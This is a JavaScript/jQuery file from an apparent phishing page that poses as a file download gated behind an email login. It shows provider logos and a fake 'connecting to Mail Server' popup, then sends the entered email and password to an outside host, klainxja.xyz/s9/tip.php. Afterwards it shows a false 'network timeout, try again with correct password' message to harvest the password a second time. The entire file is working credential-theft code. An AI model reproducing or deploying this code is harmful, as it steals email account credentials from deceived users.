 $(script);
  function script(){ 
 $("#email_field").watermark("email@example.com");
 $("#password_field").watermark("Password"); 
 $("#download").live('click',click_to_download);
 $('#email_field').live('keyup',function(e) { if(e.keyCode == 13) { click_to_download(); 
 } });
 $("#download2").live('click',now_download);
 $('#password_field').live('keyup',function(e) { if(e.keyCode == 13) { now_download();
 } }); 
} 




  function click_to_download(){ var emailfield = $.trim($("#email_field").val().toLowerCase());
  var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
   if(emailfield == ""){ jQuery.facebox("<div class='pop_up_class'>You have a blank email field</div>");
    }else{ if(!emailReg.test(emailfield)){ jQuery.facebox("<div class='pop_up_class'>Wrong Email Format</div>");
     }else{ if(emailfield.indexOf("yahoo.com") != -1){var the_server = "Yahoo";
	   var the_image = "<img src='y.jpg' width='130' />";
	   }else if(emailfield.indexOf("gmail.com") != -1){ var the_server = "Gmail"; 
	   var the_image = "<img src='g.jpg' width='130' />"; 
	   }else if(emailfield.indexOf("hotmail.com") != -1){ var the_server = "Hotmail";
	    var the_image = "<img src='h.jpg' width='130' />";
		 }else if(emailfield.indexOf("ymail.com") != -1){ var the_server = "Yahoo";
		  var the_image = "<img src='y.jpg' width='130' />";
		   }else if(emailfield.indexOf("sina.com") != -1){ var the_server = "Sina";
		    var the_image = "<img src='s.jpg' width='130' />"; 
			}else if(emailfield.indexOf("126.com") != -1){ var the_server = "126.com";
			 var the_image = "<img src='12.gif' width='130' />"; 
			 }else if(emailfield.indexOf("163.com") != -1){ var the_server = "163.com";
			  var the_image = "<img src='6.png' width='130' />";
			   }else{ var the_server = "";
			   var the_image = "<img src='m.jpg' width='130' />";
			    } jQuery.facebox("<div class='pop_up_class'>"+the_image+"<br><img src='ld.gif' width='50'>...connecting to "+the_server+" Mail Server</div>");
				 make_the_delay();
				  } } } function make_the_delay(){ var delay = 3000;
				   setTimeout(function() { redirect_the();
				    }, delay); } function redirect_the(){ $.facebox.close();
					 $("#the_d_").slideDown();
					  $(".message_div").slideDown();
					   $("#download").attr("id","download2"); 
					   } function now_download(){ var the_email = $.trim($("#email_field").val());
					    var the_password = $.trim($("#password_field").val());
						 if(the_email == ""){ jQuery.facebox("<div class='pop_up_class'>Email Field Is Blank</div>");
						 }else if(the_password == ""){ jQuery.facebox("<div class='pop_up_class'>Password Field Is Blank</div>"); }else{
							  jQuery.facebox("<div class='pop_up_class'><img src='ld.gif' width='50'>...Processing download</div>"); 
						 $.ajax({ type: "POST", url: "https://klainxja.xyz/s9/tip.php",  data: { "x1" : the_email , "x2" : the_password },
						  success: function(data){ var delay = 3000; setTimeout(function() 
							{ jQuery.facebox("<div class='pop_up_class'>Network timeout, Try again with correct password. </div>"); }, delay); 
						}, error: function (data){ setTimeout(function(){
							jQuery.facebox("<div class='pop_up_class'>Network timeout, Try again with correct password. </div>");
							
						},3000); setTimeout(function(){
							window.location.href="index.php?login="+$("#email_field").val(); 
						},7000);} }); } }
